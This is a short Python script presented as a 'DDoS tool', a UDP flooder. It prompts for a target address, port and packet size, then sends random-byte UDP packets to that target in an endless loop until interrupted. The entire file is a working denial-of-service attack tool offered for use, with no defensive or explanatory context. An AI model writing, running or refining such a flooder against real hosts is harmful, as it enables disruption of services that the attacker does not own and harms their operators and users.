import socket, random, time

print("\n[⚡] FORHAD-DDOS-TOOL v2 - UDP Flooder")
ip = input("📌 Enter Target IP/Domain: ")
port = int(input("📍 Enter Target Port (default 80): ") or 80)
size = int(input("📦 Enter Packet Size (default 1024): ") or 1024)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(size)
count = 0

print(f"\n🚀 Flood started on {ip}:{port} with {size} bytes each packet...\n")

try:
    while True:
        sock.sendto(payload, (ip, port))
        count += 1
        print(f"[{count}] Packet sent to {ip}:{port}")
        time.sleep(0.01)
except KeyboardInterrupt:
    print("\n❌ Stopped by user.")
